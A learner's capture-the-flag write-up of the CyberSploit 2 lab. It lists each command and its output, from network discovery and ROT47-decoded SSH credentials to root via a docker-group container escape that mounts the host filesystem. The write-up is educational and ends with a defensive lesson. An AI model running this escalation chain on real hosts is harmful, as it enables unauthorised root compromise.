# CyberSploit 2 — TryHackMe

## What I did

This is my documentation for the **CyberSploit 2** room. I wrote down only the steps and commands that I actually used to get from the initial network discovery to the final flag.

My goal was not just to finish the room. I wanted to understand why each step worked and how one discovery led to the next.

---

## 1. Network Discovery — `netdiscover`

I started by looking for devices that were active on my local network.

I ran:

```bash
sudo netdiscover
```

The scan showed several active hosts. One of the IP addresses I found was:

```text
192.168.29.104
```

At this point, I did not immediately assume that this was the target. I used enumeration to find out what was running on it.

---

## 2. Scanning the Target with Nmap

I then scanned `192.168.29.104` to find open ports and identify the services running on it.

I ran:

```bash
nmap -A -sV 192.168.29.104
```

The important part of the result was:

```text
22/tcp open  ssh     OpenSSH 8.0
80/tcp open  http    Apache httpd 2.4.37 ((centos))
```

Nmap also showed:

```text
http-title: CyberSploit2
```

This was a big clue that I had found the CyberSploit2 machine.

### What I understood here

- **Port 22** was running SSH, so remote login might be possible if I found valid credentials.
- **Port 80** was running a web server, so I decided to investigate the website first.
- The page title being **CyberSploit2** confirmed that this was the machine I was looking for.

---

## 3. Looking at the Web Server

Instead of only opening the website in a browser, I used `curl` to see the HTTP response and the HTML source directly.

I ran:

```bash
curl -i http://192.168.29.104
```

The server returned:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.37 (centos)
Content-Type: text/html; charset=UTF-8
```

The HTML contained a table with username/password-looking information.

Some of the entries looked normal, but two values looked strange:

```text
D92:=6?5C2
4J36CDA=@:E`
```

At the bottom of the HTML source I also noticed this comment:

```html
<!----------ROT47---------->
```

This was the important clue.

### What I understood here

The strange values were probably not random. The `ROT47` comment suggested that I needed to decode them using the ROT47 encoding.

So instead of trying random passwords against SSH, I followed the clue that was already given to me.

---

## 4. Decoding the ROT47 Values

I used Python to decode the two suspicious strings.

I ran:

```bash
python3 -c "import codecs; print(codecs.decode('D92:=6?5C2', 'rot_47')); print(codecs.decode('4J36CDA=@:E`', 'rot_47'))"
```

The decoded values gave me:

```text
shailendra
cybersploit1
```

I treated these as:

```text
Username: shailendra
Password: cybersploit1
```

### What I understood about ROT47

ROT47 is an encoding that shifts printable ASCII characters by 47 positions.

The important thing for me was not memorizing ROT47. The important part was learning to notice clues in source code and then test what those clues mean.

---

## 5. Getting Initial Access Through SSH

Earlier, my Nmap scan showed that SSH was open on port 22.

Now I had a username and password, so I tried logging in.

I ran:

```bash
ssh shailendra@192.168.29.104
```

I entered the password:

```text
cybersploit1
```

I successfully got a shell.

I checked who I was:

```bash
whoami
```

Output:

```text
shailendra
```

I also checked my current directory:

```bash
pwd
```

Output:

```text
/home/shailendra
```

Then I listed the files:

```bash
ls
```

Output:

```text
hint.txt
```

---

## 6. Checking the System

I accidentally typed:

```bash
unam -a
```

which gave me:

```text
-bash: unam: command not found
```

I corrected the command and ran:

```bash
uname -a
```

The system information showed:

```text
Linux localhost.localdomain 4.18.0-193.6.3.el8_2.x86_64
```

I then ran:

```bash
id
```

The important part of the output was:

```text
uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker)
```

This immediately caught my attention.

My user was a member of the:

```text
docker
```

group.

---

## 7. Reading the Hint

There was a file called `hint.txt` in my home directory.

I read it with:

```bash
cat hint.txt
```

The output was simply:

```text
docker
```

Now the earlier `id` result made much more sense.

I had:

```text
shailendra
    |
    +-- member of docker group
    |
    +-- hint.txt says "docker"
```

So Docker was clearly the intended direction for privilege escalation.

---

## 8. Checking Docker Images

I first checked whether there were any Docker images already available.

I ran:

```bash
docker images
```

The result was empty:

```text
REPOSITORY   TAG   IMAGE ID   CREATED   SIZE
```

There were no local images.

I did not stop there because I still needed to check whether I could actually communicate with the Docker daemon.

---

## 9. Checking Docker Access

I ran:

```bash
docker ps
```

It returned the container list without a permission error:

```text
CONTAINER ID   IMAGE   COMMAND   CREATED   STATUS   PORTS   NAMES
```

There were no running containers, but the important thing was that Docker accepted my command.

### What I understood here

Being in the `docker` group was important because it gave my user access to the Docker daemon.

Docker access can be dangerous from a security perspective because someone with this level of access can create containers with powerful access to the host.

That was exactly what I needed to investigate in this lab.

---

## 10. Docker Privilege Escalation

I used an Alpine Linux Docker image and mounted the host's entire root filesystem inside the container.

The command I used was:

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

The image was not already on the machine, so Docker downloaded it:

```text
Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
...
Status: Downloaded newer image for alpine:latest
```

After the container started, I got:

```text
[root@c05a8a755f00 /]#
```

I checked my privileges:

```bash
whoami
```

Output:

```text
root
```

I had successfully obtained a root shell.

---

## 11. Understanding the Docker Command

This command looked complicated at first, so I broke it down.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
```

### `docker run`

This creates and starts a Docker container.

### `-v /:/mnt`

This was the most important part.

It mounted the host's `/` filesystem into the container at:

```text
/mnt
```

So the container could see the host's filesystem.

### `--rm`

This tells Docker to remove the container automatically when I exit it.

### `-it`

This gave me an interactive terminal.

### `alpine`

This is the lightweight Linux image I used for the container.

### `chroot /mnt bash`

This changed the apparent root directory to the mounted `/mnt` filesystem and started Bash.

Because `/mnt` contained the host's root filesystem, I was effectively operating against the host filesystem.

---

## 12. Confirming Root Access

After the Docker command, I did not just assume that I was root.

I verified it:

```bash
whoami
```

Result:

```text
root
```

I also ran:

```bash
ls
```

and could see the host filesystem:

```text
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

This confirmed that I was looking at the host's filesystem.

---

## 13. Finding the Flag

Since I now had root access, I checked the `/root` directory:

```bash
ls -la /root
```

Among the files, I found:

```text
flag.txt
```

The full path was:

```text
/root/flag.txt
```

I read it with:

```bash
cat /root/flag.txt
```

The flag message was:

```text
Pwned CyberSploit2 POC
```

The machine also displayed:

```text
share it with me twitter@cybersploit1
```

---

# Final Attack Chain

This is how everything connected together:

```text
sudo netdiscover
        |
        v
Find target: 192.168.29.104
        |
        v
nmap -A -sV 192.168.29.104
        |
        v
Port 80 -> CyberSploit2
Port 22 -> SSH
        |
        v
curl -i http://192.168.29.104
        |
        v
Find ROT47 clue + encoded credentials
        |
        v
Decode ROT47
        |
        v
shailendra : cybersploit1
        |
        v
SSH login
        |
        v
id -> shailendra is in docker group
        |
        v
cat hint.txt -> docker
        |
        v
Verify Docker access
        |
        v
docker run -v /:/mnt --rm -it alpine chroot /mnt bash
        |
        v
whoami -> root
        |
        v
ls -la /root
        |
        v
/root/flag.txt
        |
        v
cat /root/flag.txt
        |
        v
Pwned CyberSploit2 POC
```

# What I Learned

The biggest thing I learned from this room was that the exploitation did not happen from one magic command.

It was a chain of small discoveries:

1. I discovered the target on the network.
2. I scanned it and found SSH and HTTP.
3. I investigated the website.
4. I noticed the ROT47 clue.
5. I decoded the hidden credentials.
6. I used those credentials to get SSH access.
7. I checked my user's groups.
8. I noticed that I was in the Docker group.
9. The `hint.txt` file confirmed Docker was the intended route.
10. I used Docker to access the host filesystem.
11. I verified that I had become root.
12. I accessed `/root/flag.txt`.

The main security lesson for me was:

> **Docker group membership should be treated as highly privileged access.**

A normal-looking user account can become extremely powerful if it has unrestricted access to the Docker daemon.

---

## Commands I actually used

For quick reference, these are the important commands from the successful path:

```bash
sudo netdiscover

nmap -A -sV 192.168.29.104

curl -i http://192.168.29.104

python3 -c "import codecs; print(codecs.decode('D92:=6?5C2', 'rot_47')); print(codecs.decode('4J36CDA=@:E`', 'rot_47'))"

ssh shailendra@192.168.29.104

whoami
pwd
ls
uname -a
id

cat hint.txt

docker images
docker ps

docker run -v /:/mnt --rm -it alpine chroot /mnt bash

whoami
ls
ls -la /root

cat /root/flag.txt
```

---


